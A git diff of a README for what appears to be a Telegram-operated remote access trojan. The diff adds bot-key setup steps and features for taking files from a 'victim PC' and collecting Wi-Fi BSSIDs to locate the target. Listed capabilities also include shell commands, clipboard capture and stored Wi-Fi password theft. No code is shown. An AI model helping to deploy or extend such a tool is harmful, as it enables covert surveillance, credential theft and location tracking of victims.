@@ -8,6 +8,11 @@ To install all the required modules use the following code:
 
 You will need to create a new Telegram BOT follow the steps here to create one! [Follow the steps](https://core.telegram.org/bots#6-botfather)
 
+# How to setup
+
+Before running this program edit the config.json file
+* Replace "BOT-API-HERE" with your Telegram Bot API key.
+* Replace "CHAT-ID-HERE" with your Telegram Bot's Chat ID.
 
 # 📌Available Commands
 Use "<b>/commands</b>" to show list of available commands.
@@ -20,13 +25,15 @@ Use "<b>/commands</b>" to show list of available commands.
 | 🗣️  Text To Speech on client          | To make the given text to speak               |
 | 💬  Send Message To Client            | To open a chat between attacker and target PC |
 | 🖥️  Get System Information            | To get system information                     |
+| 🗊 Get Specific File                   | To get a single file from victim PC           |
 | 🔑  Perform Shell Commands            | To run shell commands                         |
 | 🌐  Open Website                      | To open a given website                       |
-| 🖲️  Move mouse randomly and Slowly    | Moves the mouse cursor randomly               |
+| 🖲️  Move mouse randomly                | Moves the mouse cursor randomly               |
 | ⌨️  Type String                       | To type the given string                      |
 | ⚠️  Show Alert Box with given message | Show a warning MessageBox with given message  |
 | 📋  Get Clipboard                     | To get the contents in the clipboard          |
 | 🗝️  Get Wifi Password                 | To get stored wifi passwords                  |
+| 📶 Get Wi-Fi Access Points            | Gets WI-FI Access Points with BSSID (Can be used to get location!)|
 
 # 📷Screenshots
 <img src="https://user-images.githubusercontent.com/68910039/93020832-551ab500-f594-11ea-92fd-6bda9df20e94.jpg" width="500"></img>
